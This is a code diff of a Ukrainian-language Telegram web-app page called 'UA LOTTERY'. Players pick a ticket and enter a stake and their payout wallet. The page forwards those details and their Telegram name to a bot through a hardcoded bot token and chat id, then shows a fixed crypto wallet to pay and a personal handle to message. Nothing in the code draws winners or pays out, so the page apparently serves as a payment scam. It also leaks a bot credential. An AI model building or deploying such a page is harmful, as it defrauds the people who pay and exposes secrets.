@@ -2,37 +2,88 @@
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UA LOTTERY</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>UA LOTTERY 🎰</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0d1117; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .card { background: #1f2937; padding: 20px; border-radius: 20px; border: 2px solid #ffcc00; margin: 20px 0; }
-        .btn { background: #f59e0b; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 20px; font-weight: bold; width: 100%; cursor: pointer; }
+        body { background-color: #0d1117; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .ticket-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; max-width: 320px; margin: 20px auto; }
+        .ticket { background: #1e293b; border: 2px solid #475569; height: 80px; border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; transition: 0.3s; }
+        .ticket:active { transform: scale(0.9); }
+        .ticket.open { background: #f59e0b; border-color: #ffcc00; color: white; font-weight: bold; }
+        #payment-modal { display: none; background: #1f2937; padding: 20px; border-radius: 20px; border: 2px solid #ffcc00; margin-top: 20px; animation: fadeIn 0.5s; }
+        .wallet-box { background: #0d1117; color: #10b981; padding: 15px; border-radius: 12px; font-size: 11px; word-break: break-all; margin: 15px 0; border: 2px solid #10b981; cursor: pointer; font-weight: bold; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
     <h1>UA LOTTERY 🎰</h1>
-    <div class="card">
-        <p>Розіграш кожні <b>5 гравців</b></p>
-        <p>Приз: <b>80% банку</b></p>
+    <div id="game-zone">
+        <p>Оберіть свій <b>квиток</b> 👇</p>
+        <div class="ticket-container">
+            <div class="ticket" onclick="choose(1, this)">?</div>
+            <div class="ticket" onclick="choose(2, this)">?</div>
+            <div class="ticket" onclick="choose(3, this)">?</div>
+            <div class="ticket" onclick="choose(4, this)">?</div>
+            <div class="ticket" onclick="choose(5, this)">?</div>
+            <div class="ticket" onclick="choose(6, this)">?</div>
+        </div>
     </div>
-    <button class="btn" onclick="buy()">КУПИТИ КВИТОК</button>
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        function buy() {
-            const sum = prompt("Сума (від 100 UA):");
-            if (!sum || sum < 100) return;
-            const wallet = prompt("Ваш гаманець:");
-            if (!wallet) return;
-            const msg = `🎫 ЛОТЕРЕЯ\n👤: ${tg.initDataUnsafe?.user?.first_name || "Гравець"}\n💰: ${sum} UA\n💳: ${wallet}`;
-            fetch(`https://api.telegram.org/bot6584194059:AAHLZe58364vvTd_vLTIpdW98mazceu-NIc/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: "-1001451233135", text: msg })
-            }).then(() => alert("Заявку надіслано!"));
-        }
-    </script>
+
+    <div id="payment-modal">
+        <h3 style="margin:0">✅ Квиток обрано!</h3>
+        <p>Натисніть на номер для <b>копіювання</b>:</p>
+        <div class="wallet-box" id="walletDisplay" onclick="copyToClipboard()">
+            UQDXq1iAqu88tVRG62_k03kAXELu_1gzRBMye-VZoFRIRtWw
+        </div>
+        <p style="font-size:12px; color: #94a3b8;">Після оплати надішліть скріншот @Leslav2025</p>
+    </div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    const MY_WALLET = "UQDXq1iAqu88tVRG62_k03kAXELu_1gzRBMye-VZoFRIRtWw";
+
+    function choose(num, el) {
+        const amount = prompt("Квиток №" + num + "\nСума (UA):", "100");
+        if (!amount) return;
+        const userW = prompt("Ваш гаманець для виплати:");
+        if (!userW) return;
+
+        el.classList.add('open');
+        el.innerText = "№" + num;
+
+        fetch(`https://api.telegram.org/bot6584194059:AAHLZe58364vvTd_vLTIpdW98mazceu-NIc/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: "-1001451233135", 
+                text: `🎰 КВИТОК №${num}\n👤: ${tg.initDataUnsafe?.user?.first_name || "Гість"}\n💰: ${amount} UA\n💳: ${userW}` 
+            })
+        }).then(() => {
+            document.getElementById('game-zone').style.display = 'none';
+            document.getElementById('payment-modal').style.display = 'block';
+        });
+    }
+
+    function copyToClipboard() {
+        const area = document.createElement('textarea');
+        area.value = MY_WALLET;
+        document.body.appendChild(area);
+        area.select();
+        document.execCommand('copy');
+        document.body.removeChild(area);
+        
+        const box = document.getElementById('walletDisplay');
+        const originalText = box.innerText;
+        box.innerText = "СКОПІЙОВАНО!";
+        box.style.color = "#ffffff";
+        
+        setTimeout(() => {
+            box.innerText = MY_WALLET;
+            box.style.color = "#10b981";
+        }, 2000);
+    }
+</script>
 </body>
 </html>
